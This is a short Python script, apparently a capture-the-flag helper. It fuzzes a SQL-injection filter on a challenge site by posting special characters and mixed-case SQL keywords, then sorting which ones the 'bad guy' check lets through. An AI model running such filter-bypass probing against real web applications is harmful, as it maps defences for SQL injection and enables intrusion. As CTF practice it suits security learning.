# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import requests

chars = '`!,.?/\@#%^&*()_+-=<>\'"{}[];:\x20\x09\x0A\x0B\x0C\x0D\xA0'
words = """
SelEct
cHar
AnD
Or
XoR
FrOM
OrDeR
bY
iNseRt
DeLAte
uNIoN
cOnCat
"""

PASSED_CHAR = []
FILTERED_CHAR = []


def get_payloads():
    payloads = [i.strip() for i in chars]
    payloads.extend([i.strip() for i in words.split('\n') if i])
    return payloads


def fuzzone(payload):
    d = {
        'name': payload,
    }
    h = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    r = requests.post('http://aliceandbob.bctf.xctf.org.cn/query/', data=d, headers=h)

    if 'bad guy' not in r.content:
        return True
    return False


# [',', '.', '?', '@', '#', '_', '=', '{', '}', '[', ']', ':', '\xa0', 'cHar', 'bY', 'DeLAte']

if __name__ == '__main__':
    payloads = get_payloads()
    for item in payloads:
        if fuzzone(item):
            PASSED_CHAR.append(item)
        else:
            FILTERED_CHAR.append(item)

    print len(PASSED_CHAR), len(FILTERED_CHAR)
    print PASSED_CHAR
    print FILTERED_CHAR
